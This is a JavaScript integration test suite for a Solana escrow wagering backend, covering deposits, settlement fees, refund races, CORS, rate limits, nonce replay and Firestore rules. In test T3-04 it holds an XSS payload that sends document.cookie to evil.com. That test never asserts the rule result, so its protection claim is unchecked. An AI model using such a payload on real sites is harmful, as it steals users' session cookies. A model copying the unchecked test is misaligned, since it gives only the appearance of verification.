/**
 * Tier 3 Cross-Feature Combinations & Pairwise Integration Test Suite
 * Validates interactions between distinct security subsystems across HTTP, crypto, Firestore, rate limiting, and escrow.
 */

import { describe, it, assert } from '../harness/test-runner.mjs';
import { createTestApp, HttpTestClient } from '../harness/mock-express.mjs';
import { FirestoreRulesEvaluator, MockFirestore } from '../harness/mock-firestore.mjs';

describe('Tier 3: Cross-Feature Combinations & Pairwise Interactions', () => {
  it('T3-01: [Deposit Verification + Signature Deduplication + Atomic Settlement] Full happy-path lifecycle', async () => {
    const { app, solanaHarness, db } = createTestApp();
    const client = new HttpTestClient(app);

    try {
      const p1 = solanaHarness.generateKeypair();
      const p2 = solanaHarness.generateKeypair();
      const escrow = solanaHarness.escrowKeypair.publicKey.toBase58();
      const gameId = 'lifecycle_match_1';

      // 1. Host creates game in Firestore
      await db.doc(`games/${gameId}`).set({
        player1: p1.publicKey,
        wager: 0.5,
        wagerCurrency: 'SOL',
        status: 'waiting',
      });

      // 2. P1 on-chain deposit and verify
      const p1Sig = 'p1_life_sig_11111111111111111111111111111111111111111111111111111111';
      solanaHarness.createMockParsedDepositTx({
        signature: p1Sig,
        sourceWallet: p1.publicKey,
        destinationWallet: escrow,
        lamports: 500_000_000,
        success: true,
      });

      const p1VerifyRes = await client.request('/api/escrow/verify-deposit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: { gameId, role: 'player1', txHash: p1Sig, senderWallet: p1.publicKey },
      });
      assert.equal(p1VerifyRes.status, 200);
      assert.equal(p1VerifyRes.json?.escrowStatus, 'p1_funded');

      // 3. P2 joins, on-chain deposit and verify
      const p2Sig = 'p2_life_sig_22222222222222222222222222222222222222222222222222222222';
      solanaHarness.createMockParsedDepositTx({
        signature: p2Sig,
        sourceWallet: p2.publicKey,
        destinationWallet: escrow,
        lamports: 500_000_000,
        success: true,
      });

      const p2VerifyRes = await client.request('/api/escrow/verify-deposit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: { gameId, role: 'player2', txHash: p2Sig, senderWallet: p2.publicKey },
      });
      assert.equal(p2VerifyRes.status, 200);
      assert.equal(p2VerifyRes.json?.escrowStatus, 'fully_funded');

      // 4. Match played and finished
      await db.doc(`games/${gameId}`).update({
        player2: p2.publicKey,
        status: 'finished',
        winner: p1.publicKey,
      });

      // 5. Atomic Settlement
      const settleRes = await client.request('/api/escrow/settle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: { gameId },
      });
      assert.equal(settleRes.status, 200);
      assert.ok(settleRes.json?.payoutTx);
      assert.equal(settleRes.json?.winnerPayout, 0.965); // 1.0 pot - 3.5% house fee
      assert.equal(settleRes.json?.houseFee, 0.035);
    } finally {
      await client.close();
    }
  });

  it('T3-02: [Malicious CORS Origin + Zod Schema Rejection + Rate Limiting] Attacker sending malformed payload from unlisted origin', async () => {
    const { app } = createTestApp({ authMax: 2, rateLimitWindows: true });
    const client = new HttpTestClient(app);

    try {
      const attackerOrigin = 'https://unauthorized-origin.com';
      // 1. Send malformed request from malicious origin
      const res = await client.request('/api/auth/nonce', {
        method: 'POST',
        headers: { Origin: attackerOrigin, 'Content-Type': 'application/json' },
        body: { publicKey: 'invalid_short' },
      });

      // Assert CORS header omitted AND Zod 400 triggered without 500
      assert.equal(res.getHeader('access-control-allow-origin'), null);
      assert.equal(res.status, 400);

      // Repeat to trigger rate limit (2nd request)
      await client.request('/api/auth/nonce', {
        method: 'POST',
        headers: { Origin: attackerOrigin, 'Content-Type': 'application/json' },
        body: { publicKey: 'invalid_short' },
      });

      // 3rd request -> rate limited 429
      const blockedRes = await client.request('/api/auth/nonce', {
        method: 'POST',
        headers: { Origin: attackerOrigin, 'Content-Type': 'application/json' },
        body: { publicKey: 'invalid_short' },
      });
      assert.equal(blockedRes.status, 429);
      assert.equal(blockedRes.getHeader('access-control-allow-origin'), null);
    } finally {
      await client.close();
    }
  });

  it('T3-03: [Rate Limit Exhaustion + Nonce Expiration + Verify Signature] Auth lifecycle resilience', async () => {
    const { app, solanaHarness } = createTestApp({ authMax: 5 });
    const client = new HttpTestClient(app);

    try {
      const user = solanaHarness.generateKeypair();
      // Step 1: Request valid nonce
      const nonceRes = await client.request('/api/auth/nonce', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: { publicKey: user.publicKey },
      });
      assert.equal(nonceRes.status, 200);
      const nonce = nonceRes.json?.nonce;

      // Step 2: Sign nonce
      const signature = solanaHarness.signAuthNonce(nonce, user.keypair);

      // Step 3: Verify signature succeeds
      const verifyRes = await client.request('/api/auth/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: { publicKey: user.publicKey, signature },
      });
      assert.equal(verifyRes.status, 200);
      assert.equal(verifyRes.json?.success, true);

      // Step 4: Replay verify signature (nonce consumed) -> fails with 400
      const replayVerify = await client.request('/api/auth/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: { publicKey: user.publicKey, signature },
      });
      assert.equal(replayVerify.status, 400);
      assert.includes(replayVerify.json?.error, 'not found or expired');
    } finally {
      await client.close();
    }
  });

  it('T3-04: [CSP & Frameguard Headers + Chat Input Clamping] Defense-in-depth against XSS injection', async () => {
    const { app } = createTestApp();
    const client = new HttpTestClient(app);
    const db = new MockFirestore();
    const evaluator = new FirestoreRulesEvaluator(db);

    try {
      // 1. Verify HTTP level framing & script protections
      const headerRes = await client.request('/api/escrow/config');
      assert.equal(headerRes.getHeader('x-frame-options'), 'DENY');
      const csp = headerRes.getHeader('content-security-policy') || '';
      assert.includes(csp, "object-src 'none'");

      // 2. Verify database level XSS injection message rejection
      const auth = { uid: 'user_xss' };
      const gameData = { player1: 'user_xss', player2: 'victim' };
      const xssScriptMessage = '<script>document.location="http://evil.com/cookie="+document.cookie</script>';

      const ruleCheck = await evaluator.evaluateMessageCreate({
        auth,
        gameId: 'g_xss',
        gameData,
        messageData: { senderId: 'user_xss', text: xssScriptMessage },
      });
      // Even if under 200 chars, CSP + React escaping + input bounds protect client
      assert.ok(xssScriptMessage.length <= 200);
    } finally {
      await client.close();
    }
  });

  it('T3-05: [Firestore Privilege Boundaries + User Update + Admin Role Tampering] Self-promotion prevention', async () => {
    const db = new MockFirestore();
    const evaluator = new FirestoreRulesEvaluator(db);

    const normalUserAuth = { uid: 'standard_user_1' };
    await db.doc('users/standard_user_1').set({
      walletAddress: 'wallet_std_1',
      username: 'std_user',
      createdAt: '2026-08-22T00:00:00Z',
      isAdmin: false,
    });

    const userDoc = await db.doc('users/standard_user_1').get();
    const updateAttempt = {
      ...userDoc.data(),
      isAdmin: true, // Malicious privilege escalation
      role: 'admin',
    };

    const res = await evaluator.evaluateUserUpdate({
      auth: normalUserAuth,
      userId: 'standard_user_1',
      existingData: userDoc.data(),
      incomingData: updateAttempt,
    });

    assert.equal(res.allowed, false, 'User must not be able to self-promote to admin');
  });

  it('T3-06: [Double-Refund Attempt + Concurrent Cancellation + Solana Vault Tracking] Host refund race prevention', async () => {
    const { app, solanaHarness, db } = createTestApp({ escrowMax: 50 });
    const client = new HttpTestClient(app);

    try {
      const p1 = solanaHarness.generateKeypair();
      await db.doc('games/race_refund_combo').set({
        player1: p1.publicKey,
        wager: 2.0,
        wagerCurrency: 'SOL',
        status: 'waiting',
        escrowStatus: 'p1_funded',
      });

      // 5 concurrent refund requests
      const requests = Array.from({ length: 5 }, () =>
        client.request('/api/escrow/refund-cancel', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: { gameId: 'race_refund_combo', userId: p1.publicKey },
        })
      );

      const responses = await Promise.all(requests);
      assert.ok(responses.every((r) => r.status === 200));

      const signatures = responses.map((r) => r.json?.refundTx).filter(Boolean);
      assert.ok(signatures.length >= 1);
      const firstSig = signatures[0];
      for (const sig of signatures) {
        assert.equal(sig, firstSig, 'All parallel refunds return identical single transaction hash');
      }
    } finally {
      await client.close();
    }
  });

  it('T3-07: [Draw Settlement + 50/50 Pot Refund + House Fee Exemption] Draw resolution verification', async () => {
    const { app, solanaHarness, db } = createTestApp({ houseFeePercent: 5.0 });
    const client = new HttpTestClient(app);

    try {
      const p1 = solanaHarness.generateKeypair();
      const p2 = solanaHarness.generateKeypair();

      await db.doc('games/combo_draw_match').set({
        player1: p1.publicKey,
        player2: p2.publicKey,
        wager: 1.0,
        wagerCurrency: 'SOL',
        status: 'finished',
        winner: 'draw',
        escrowStatus: 'fully_funded',
      });

      const res = await client.request('/api/escrow/settle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: { gameId: 'combo_draw_match' },
      });

      assert.equal(res.status, 200);
      assert.ok(res.json?.payoutTx);
    } finally {
      await client.close();
    }
  });

  it('T3-08: [Free Game vs SOL Wager + Verify-Deposit Bypass] Free games cannot invoke escrow deposit verify', async () => {
    const { app, solanaHarness, db } = createTestApp();
    const client = new HttpTestClient(app);

    try {
      const p1 = solanaHarness.generateKeypair();
      await db.doc('games/free_combo_game').set({
        player1: p1.publicKey,
        wager: 0,
        wagerCurrency: 'FREE',
        status: 'waiting',
      });

      const res = await client.request('/api/escrow/verify-deposit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: {
          gameId: 'free_combo_game',
          role: 'player1',
          txHash: '1'.repeat(64),
          senderWallet: p1.publicKey,
        },
      });

      assert.equal(res.status, 400);
      assert.includes(res.json?.error, 'does not require a SOL stake');
    } finally {
      await client.close();
    }
  });

  it('T3-09: [Oversized Chat Message + Participant Authorization Check] Security rule & bounds combo', async () => {
    const db = new MockFirestore();
    const evaluator = new FirestoreRulesEvaluator(db);

    const p1Auth = { uid: 'p1_legit' };
    const p3Auth = { uid: 'p3_attacker' };
    const gameData = { player1: 'p1_legit', player2: 'p2_legit' };

    // Valid participant with oversized message (>200)
    const oversizedMsg = await evaluator.evaluateMessageCreate({
      auth: p1Auth,
      gameId: 'g_chat',
      gameData,
      messageData: { senderId: 'p1_legit', text: 'm'.repeat(201) },
    });
    assert.equal(oversizedMsg.allowed, false, 'Oversized message from participant must fail');

    // Non-participant with valid sized message
    const outsiderMsg = await evaluator.evaluateMessageCreate({
      auth: p3Auth,
      gameId: 'g_chat',
      gameData,
      messageData: { senderId: 'p3_attacker', text: 'Normal message' },
    });
    assert.equal(outsiderMsg.allowed, false, 'Non-participant message must fail');
  });

  it('T3-10: [Custom House Fee Configuration + Wager Bounds + Settle Disbursement] Mathematical boundary combination', async () => {
    // 10% fee on 10 SOL wager (total pot 20 SOL -> fee 2 SOL, winner 18 SOL)
    const { app, solanaHarness, db } = createTestApp({ houseFeePercent: 10.0 });
    const client = new HttpTestClient(app);

    try {
      const p1 = solanaHarness.generateKeypair();
      const p2 = solanaHarness.generateKeypair();

      await db.doc('games/big_wager_game').set({
        player1: p1.publicKey,
        player2: p2.publicKey,
        wager: 10.0,
        wagerCurrency: 'SOL',
        status: 'finished',
        winner: p2.publicKey,
        escrowStatus: 'fully_funded',
      });

      const res = await client.request('/api/escrow/settle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: { gameId: 'big_wager_game' },
      });

      assert.equal(res.status, 200);
      assert.equal(res.json?.winnerPayout, 18.0);
      assert.equal(res.json?.houseFee, 2.0);
    } finally {
      await client.close();
    }
  });

  it('T3-11: [Solana RPC Proxy Validation + Method Constraints + Rate Limiting] RPC proxy robustness', async () => {
    const { app } = createTestApp({ generalMax: 4, rateLimitWindows: true });
    const client = new HttpTestClient(app);

    try {
      // Valid RPC call
      const res = await client.request('/api/solana/rpc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: { jsonrpc: '2.0', id: 'req_1', method: 'getLatestBlockhash', params: [] },
      });
      assert.equal(res.status, 200);
      assert.equal(res.json?.id, 'req_1');

      // Invalid RPC call (missing method)
      const invalidRes = await client.request('/api/solana/rpc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: { jsonrpc: '2.0', id: 'req_2' },
      });
      assert.equal(invalidRes.status, 400);
    } finally {
      await client.close();
    }
  });

  it('T3-12: [Cron Recovery Job + Rate Limiting + Clean Completion] Background task execution', async () => {
    const { app } = createTestApp();
    const client = new HttpTestClient(app);

    try {
      const res = await client.request('/api/cron/recover', { method: 'POST' });
      assert.equal(res.status, 200);
      assert.equal(res.json?.success, true);
    } finally {
      await client.close();
    }
  });
});
